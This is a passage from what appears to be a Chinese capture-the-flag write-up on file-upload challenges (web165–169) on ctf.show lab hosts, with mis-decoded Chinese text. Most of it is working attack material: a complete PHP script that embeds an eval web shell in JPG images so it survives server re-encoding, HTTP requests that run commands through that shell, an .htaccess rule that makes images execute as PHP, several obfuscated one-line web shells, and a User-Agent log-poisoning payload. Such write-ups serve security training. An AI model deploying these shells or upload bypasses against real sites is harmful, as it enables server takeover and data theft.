</span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://113f313e-076e-4fc6-9c58-07e68e75cc22.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">1</span>=tac f*</span></span><br></pre></td></tr></table></figure><h4><span id="web-165">web 165</span></h4><ul><li>å¤§ç¥çš„è„šæœ¬</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;</span>; <span class="comment">//æ³¨æ„$è½¬ä¹‰</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> =</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                        <span class="variable">$miniPayload</span> .</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>å…ˆéšä¾¿æˆªä¸ªå›¾ç„¶åä¸Šä¼ åˆ°æœåŠ¡å™¨åä¸‹è½½ä¸‹æ¥ã€‚</p></li><li><p>å°†ä¸‹è½½ä¸‹æ¥çš„å›¾ç‰‡æ”¾åˆ°è„šæœ¬ç›®å½•ä¸‹ï¼Œè¿è¡Œ&#96; php jpg_payload.php download.jpg </p></li><li><p>ä½¿ç”¨èšå‰‘é“¾æ¥æˆ–è€…ä½¿ç”¨bp</p></li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/download.php?image=8ef28ae0fc43a1cb9d73b76784b5fd02.jpg</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>900b6ebe-ba3e-486d-9e2d-ffd2c0fa6729.challenge.ctf.show</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://900b6ebe-ba3e-486d-9e2d-ffd2c0fa6729.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">7</span>=system(<span class="string">&#x27;cat f*&#x27;</span>)<span class="comment">;</span></span></span><br></pre></td></tr></table></figure><h4><span id="web166">web166</span></h4><p>å¦‚æœä¸Šä¼ ä¸äº†ï¼ŒæŠŠContent-Typeè®¾ç½®ä¸€ä¸‹<code>Content-Type: application/x-zip-compressed</code></p><h4><span id="web167">web167</span></h4><ul><li>è€ƒç‚¹ï¼šApacheçš„åŒ…å«è§£æ</li></ul><p>ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php .jpg </span><br></pre></td></tr></table></figure><h4><span id="web-168">web 168</span></h4><p>ä½¿ç”¨&#96;&#96;ç»•è¿‡</p><ol><li>ä¸Šä¼ pngå›¾ç‰‡ï¼Œé€šè¿‡bpå°†åç¼€æ”¹æˆ<code>1.php</code>ï¼Œç„¶åç»“å°¾åŠ ä¸Š<code>&lt;?=`tac ../f*`?&gt;</code></li><li>è®¿é—®xxx&#x2F;upload&#x2F;1.phpå³å¯</li></ol><p>ä¸Šä¼ phpæ–‡ä»¶å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">strrev</span>(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4><span id="web169">web169</span></h4><p>æŸ¥çœ‹å‰ç«¯æºä»£ç ï¼Œè¿™é“é¢˜å‰ç«¯è®©æˆ‘ä»¬ä¼ zipï¼Œç„¶ååœ¨bpé‡Œé¢æ”¹æˆimage&#x2F;pngå› ä¸ºåç«¯åªæ¥å—pngå›¾ç‰‡ï¼Œç„¶åå’Œå‰é¢uaç»•è¿‡çš„æ–¹å¼ä¸€æ ·ï¼Œé€šè¿‡<code>.user.ini</code>æ–‡ä»¶åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åè®¿é—®&#x2F;upload&#x2F;è·¯å¾„ï¼Œä½†æ˜¯å‘ç°404.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>225</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?=eval($_POST[1]);?&gt;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryMmAfVSTikIwEpnAY</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryMmAfVSTikIwEpnAY</span></span></span><br><span class="line"><span 